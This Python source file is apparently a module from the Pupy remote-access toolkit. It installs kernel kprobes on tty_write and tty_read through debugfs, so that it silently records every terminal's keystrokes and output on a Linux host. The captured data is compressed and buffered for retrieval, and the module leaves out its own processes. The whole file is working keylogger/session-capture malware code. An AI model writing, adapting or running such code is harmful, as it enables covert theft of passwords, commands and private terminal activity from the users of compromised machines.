# -*- encoding: utf-8 -*-

__all__ = [
    'TTYMon', 'TTYRec', 'start', 'stop', 'dump'
]

import os
import re
import fcntl
import select
import errno
import struct
import zlib

from threading import Lock

from pupy import manager, Task

if not __name__ == '__main__':
    from network.lib.buffer import Buffer

KPROBE_REGISTRY='tracing/kprobe_events'
TRACE_PIPE='tracing/trace_pipe'
TRACE='tracing/trace'
KPROBE_EVENTS='tracing/events/kprobes'
KPROBES_ENABLED='kprobes/enabled'
DEBUGFS='/sys/kernel/debug'

class KProbesNotAvailable(Exception):
    pass

class KProbesNotEnabled(Exception):
    pass

class Kallsyms(object):
    def __init__(self):
        with open('/proc/kallsyms') as kallsyms:
            for ks in kallsyms:
                ks = ks.strip()
                addr, t, name = ks.split(' ')[:3]
                setattr(self, name, addr)

class TTYMon(object):
    def __init__(self, probe_name='ttymon', ignore=[]):
        self.validate()

        kallsyms = Kallsyms()

        self._ignore = [ignore] if type(ignore) is int else ignore
        self._probe_name = probe_name

        self._tty_write_statement = 'p:{}_w 0x{} %dx:s32 +0(%si):string'.format(
            self._probe_name, kallsyms.tty_write
        )

        self._tty_read_statement = 'r:{}_r 0x{} $retval:s64 +0($stack2):string'.format(
            self._probe_name, kallsyms.tty_read
        )

        self._tty_read_statement_new = 'r:{}_r tty_read $retval:s64 +0($stack2):string'.format(
            self._probe_name
        )

        self._started = False
        self._stopping = False
        self._stopped = True
        self._pipe = None
        self._pipe_fd = None
        self._parser_body = r'\s+(\S+)-(\d+)\s+\[\d+\]\s+[^\s]+\s+(\d+)\.(\d+):' \
            r'\s+{}_([r|w]):\s+\([^+]+\+[^)]+\)\s+arg1=(\d+)\s+arg2="'.format(
                self._probe_name)

        self._parser_start = re.compile(self._parser_body)
        self._parser_end = re.compile('"\n'+self._parser_body, re.MULTILINE)

    def validate(self):
        if not os.path.exists(os.path.join(DEBUGFS, KPROBE_REGISTRY)):
            raise KProbesNotAvailable('Tracing using KProbes are not accessible/available')

        with open(os.path.join(DEBUGFS, KPROBES_ENABLED)) as enabled:
            if int(enabled.read().strip()) == 0:
                raise KProbesNotEnabled('KProbes were intentionally disabled')

    def stop(self):
        self._stopping = True

    @property
    def active(self):
        return self._started and not self._stopped

    def _enable(self):

        # Ensure stopped
        self._disable()

        self._stopped = False
        self._stopping = False

        try:
            with open(os.path.join(DEBUGFS, KPROBE_REGISTRY), 'w') as registry:
                registry.write(self._tty_write_statement+'\n')
                # Try to use explicit symbol name
                registry.write(self._tty_read_statement_new+'\n')

        except IOError:
            with open(os.path.join(DEBUGFS, KPROBE_REGISTRY), 'w') as registry:
                registry.write(self._tty_write_statement+'\n')
                # Try to use explicit symbol name
                registry.write(self._tty_read_statement+'\n')

        with open(os.path.join(DEBUGFS, KPROBE_EVENTS, self._probe_name+'_w', 'enable'), 'w') as enable:
            enable.write('1\n')
        with open(os.path.join(DEBUGFS, KPROBE_EVENTS, self._probe_name+'_r', 'enable'), 'w') as enable:
            enable.write('1\n')

        self._started = True

    def _disable(self):
        w_enable = os.path.join(DEBUGFS, KPROBE_EVENTS, self._probe_name+'_w', 'enable')
        r_enable = os.path.join(DEBUGFS, KPROBE_EVENTS, self._probe_name+'_r', 'enable')

        if os.path.exists(w_enable):
            with open(w_enable, 'w') as enable:
                enable.write('0\n')
        else:
            w_enable = None

        if os.path.exists(r_enable):
            with open(r_enable, 'w') as enable:
                enable.write('0\n')
        else:
            r_enable = None

        if w_enable or r_enable:
            if w_enable:
                with open(os.path.join(DEBUGFS, KPROBE_REGISTRY), 'w') as registry:
                    registry.write('-:{}_w\n'.format(self._probe_name)+'\n')

            if r_enable:
                with open(os.path.join(DEBUGFS, KPROBE_REGISTRY), 'w') as registry:
                    registry.write('-:{}_r\n'.format(self._probe_name)+'\n')

        self._started = False
        self._stopped = True

    def __iter__(self):
        self._enable()

        try:
            with open(os.path.join(DEBUGFS, TRACE), 'w') as trace:
                trace.write('')

            self._pipe = open(os.path.join(DEBUGFS, TRACE_PIPE), 'r')
            self._pipe_fd = self._pipe.fileno()

            flag = fcntl.fcntl(self._pipe_fd, fcntl.F_GETFL)
            fcntl.fcntl(self._pipe_fd, fcntl.F_SETFL, flag | os.O_NONBLOCK)

            for block in self._collector():
                yield block
        finally:
            try:
                self._disable()
            except IOError:
                pass

            self._pipe.close()

        self._stopped = True
        self._started = False

    def _collector(self):
        more = True
        buf = ''

        while not self._stopping:
            if more:
                try:
                    r = os.read(self._pipe_fd, 8192)
                    buf += r
                except OSError, e:
                    if e.errno not in (errno.EAGAIN, errno.ENODATA):
                        raise

                    _, _, xlist = select.select([self._pipe], [], [self._pipe], 10)
                    if xlist:
                        break

                    continue

            start = self._parser_start.search(buf)
            if not start:
                more = True
                continue

            header_end = start.end()

            rest = buf[header_end:]

            end = self._parser_end.search(rest)
            eob = len(rest)

            if end:
                eob = end.start()+2
                more = False
            else:
                more = True
                # Need more data
                # We will lose last block, but who cares
                if not buf.endswith('"\n'):
                    continue

            comm, pid, sec, usec, probe, items = start.groups()
            pid = int(pid)
            items = int(items)
            sec = int(sec)
            usec = int(usec)

            data = rest[:items]
            buf = rest[eob:]

            if pid not in self._ignore:
                yield comm, pid, probe, sec, usec, data


class TTYRec(Task):
    __slots__ = ('_ttymon', '_results_lock', '_state')

    def __init__(self, manager):
        super(TTYRec, self).__init__(manager)
        self._ttymon = TTYMon(ignore=[os.getpid(), os.getppid()])
        self._results_lock = Lock()
        self._buffer = Buffer()
        self._compressor = zlib.compressobj(9)

    def task(self):
        for comm, pid, probe, sec, usec, buf in self._ttymon:
            with self._results_lock:
                packet = self._compressor.compress(
                    struct.pack(
                        '<16ssIIII',
                        comm[:16], probe, pid,
                        sec, usec, len(buf)) + buf)
                self._buffer.append(packet)
                self._dirty = True

    @property
    def results(self):
        result = None

        with self._results_lock:
            if not self._dirty:
                return None

            try:
                packet = self._compressor.flush()
                self._buffer.append(packet)
            except zlib.error:
                pass

            result = self._buffer
            self._buffer = Buffer()
            self._compressor = zlib.compressobj(9)
            self._dirty = False

        return result

    @property
    def active(self):
        return self._ttymon.active

    def stop(self):
        super(TTYRec, self).stop()
        self._ttymon.stop()


def start(event_id=None):
    try:
        if manager.active(TTYRec):
            return False
    except:
        try:
            manager.stop(TTYRec)
        except:
            pass

    return manager.create(TTYRec, event_id=event_id)

def stop():
    return manager.stop(TTYRec)

def dump():
    ttyrec = manager.get(TTYRec)
    if ttyrec:
        return ttyrec.results

if __name__ == '__main__':
    mon = TTYMon(ignore=[os.getpid(), os.getppid()])

    recs = {}

    try:
        for comm, pid, probe, sec, usec, buf in mon:
            key = frozenset((comm, pid, probe))

            if key not in recs:
                recs[key] = open('rec.{}.{}.{}.{}'.format(sec, comm, pid, probe), 'w')

            recs[key].write(struct.pack('<III', sec, usec, len(buf)) + buf)

    finally:
        for rec in recs.itervalues():
            rec.close()
